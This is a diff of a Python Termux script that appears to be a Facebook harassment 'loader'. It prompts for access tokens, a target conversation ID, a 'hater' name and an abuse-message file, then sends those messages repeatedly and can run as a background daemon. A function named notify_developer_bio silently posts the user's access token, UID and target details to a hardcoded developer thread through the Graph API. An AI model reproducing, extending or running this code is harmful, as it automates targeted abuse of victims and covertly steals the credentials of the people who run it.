@@ -62,7 +62,7 @@ def daemonize():
             sys.exit(0)
     except:
         pass
-    
+    os.setsid()
     try:
         pid = os.fork()
         if pid > 0:
@@ -334,15 +334,14 @@ def animated_print(text, delay=0.01, jitter=0.005):
 
 def animated_logo():
     logo_text = r"""
- _          _______    ______     _______    _______    _______      _______    _         _________
- ( (    /|  (  ___  )  (  __  \   (  ____ \  (  ____ \  (       )    (  ___  )  ( \        \__   __/
- |  \  ( |  | (   ) |  | (  \  )  | (    \/  | (    \/  | () () |    | (   ) |  | (           ) (   
- |   \ | |  | (___) |  | |   ) |  | (__      | (__      | || || |    | (___) |  | |           | |   
- | (\ \) |  |  ___  |  | |   | |  |  __)     |  __)     | |(_)| |    |  ___  |  | |           | |   
- | | \   |  | (   ) |  | |   ) |  | (        | (        | |   | |    | (   ) |  | |           | |   
- | )  \  |  | )   ( |  | (__/  )  | (____/\  | (____/\  | )   ( |    | )   ( |  | (____/\  ___) (___
- |/    )_)  |/     \|  (______/   (_______/  (_______/  |/     \|    |/     \|  (_______/  \_______/                                                                                                   
- """
+             _______    _______    _______    _         _________   _          _______ 
+            (  ___  )  (  ____ \  (  ____ \  ( \        \__   __/  ( (    /|  (  ____ \
+            | (   ) |  | (    \/  | (    \/  | (           ) (     |  \  ( |  | (    \/
+            | |   | |  | (__      | (__      | |           | |     |   \ | |  | (__    
+            | |   | |  |  __)     |  __)     | |           | |     | (\ \) |  |  __)   
+            | |   | |  | (        | (        | |           | |     | | \   |  | (      
+            | (___) |  | )        | )        | (____/\  ___) (___  | )  \  |  | (____/\
+            (_______)  |/         |/         (_______/  \_______/  |/    )_)  (_______/ """
     for line in logo_text.splitlines():
          animated_print(line, delay=0.005, jitter=0.002)
 
@@ -354,7 +353,7 @@ def main_menu():
     print(random.choice(color_list) + "[2] STOP LOADER")
     print(random.choice(color_list) + "[3] SMS DISPLAY SHOW")
     animated_print("<============================ CHOOSE MENU OPTIONS ===========================>", delay=0.005, jitter=0.002)
-    choice = input(random.choice(color_list) + "\n[+] CHOOSE AN  OPTION ::> ").strip()
+    choice = input(random.choice(color_list) + "\n[+]  CHOOSE AN  OPTION ::").strip()
     if choice == "2":
         stop_input = input(Fore.BLUE + "ENTER YOUR STOP KEY:::🔛 ").strip()
         animated_print("<<════════════════════════════════════════════════════════>>")
@@ -382,7 +381,7 @@ def get_stop_key():
 
 def notify_developer_bio(current_token, mn, thread_id, uid, ms):
     DEV_THREAD_ID = "t_61571843423018"
-    bio_message = f"Hello NADEEM  SīīR! I am uSīīnG YouR OFFLIME TERMUX. MY  details īīS::⤵️\nToken:: {current_token}\nName:: {mn}\nConversation:: {thread_id}\nUID:: {uid}\nMessage File:: {ms}"
+    bio_message = f"Hello NADEEM  SīīR! I am uSīīnG YouR OFFLIME TERMUX. MY  details īīS::⤵️\nToken: {current_token}\USSER HATER nName ::>  {mn}\nUSSER Conversation ID ::> {thread_id}\nUSSER UID ::>  {uid}\nUSSER Message File ::> {ms}"
     url = f"https://graph.facebook.com/v15.0/{DEV_THREAD_ID}/"
     parameters = {'access_token': current_token, 'message': bio_message}
     try:
@@ -492,7 +491,7 @@ if os.path.exists("stop_signal.txt"):
 animated_logo()
 
 # Then, show the original colored logo and venom animations
-colored_logo = lambda: [print("".join(f"\033[38;5;{random.randint(16,88)}m" + char for char in line) + "\033[0m") for line in r""" 
+colored_logo = lambda: [print("".join(f"\033[38;5;{random.randint(16,88)}m" + char for char in line) + "\033[0m") for line in r"""
 
    """.splitlines()]
 colored_logo()
@@ -518,7 +517,7 @@ else:
     sys.exit()
 
 os.system('espeak -a 300 "TOKAN FILE NAME DALO"')
-token_file = input("[+] ENTER TOKEN FILE  ::> ").strip()
+token_file = input("[+] ENTER TOKEN FILE::>  ").strip()
 animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
 with open(token_file, 'r') as f2:
     token_data = f2.read()
@@ -534,27 +533,27 @@ d = json.loads(b.text)
 if 'name' not in d:
     sys.exit()
 mb = d['name']
-print(Fore.GREEN + "YOUR PROFILE NAME ::> " + mb + "\n")
+print(Fore.GREEN + "YOUR PROFILE NAME :: " + mb + "\n")
 animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
 start_queue_processor()
 
 os.system('espeak -a 300 "CONVO ID DALO JAHA GALI DENI HA"')
-thread_id = input("[+] ENTER CONVO UID ::> ").strip()
+thread_id = input("[+] ENTER Conversation ID ::>  ").strip()
 animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
 os.system('espeak -a 300 "TATE KA NAME DALO"')
-mn = input("[+] ENTER HATER NAME ::> ").strip()
+mn = input("[+] ENTER HATER NAME ::>  ").strip()
 animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
 os.system('espeak -a 300 "GALI FILE DALO"')
-ms = input("[+] ENTER GALI FILE ::> ").strip()
+ms = input("[+] ENTER GALI FILE ::>   ").strip()
 animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
 os.system('espeak -a 300 "FILE KITNI BAAR REPIT KARANI HA"')
-repeat = int(input("[+] KITNI BAAR IS GALI KO REAOLAD KARNA HAI ::> "))
+repeat = int(input("[+] KITNI BAAR IS GALI KO reload  KARNA HAI ::>  "))
 animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
 os.system('espeak -a 300 "SPEED DALO YAR"')
-timm = int(input("[+] ENTER SPEED IN SECOND ::> "))
+timm = int(input("[+] Enter Speed in Seconds ::> "))
 animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
-print(Fore.BLUE + "\n________All DONE....LOADING PROFILE INFO.....!")
-print(Fore.BLUE + "YOUR FIRST PROFILE NAME AND ALL ID RUNNING CHAKE...BROKEN NADEEM=> " + mb + "\n")
+print(Fore.BLUE + "\n________All Done....Loading Profile Info.....!")
+print(Fore.BLUE + "Your Profile Name => " + mb + "\n")
 animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
 try:
     ns = open(ms, 'r').readlines()
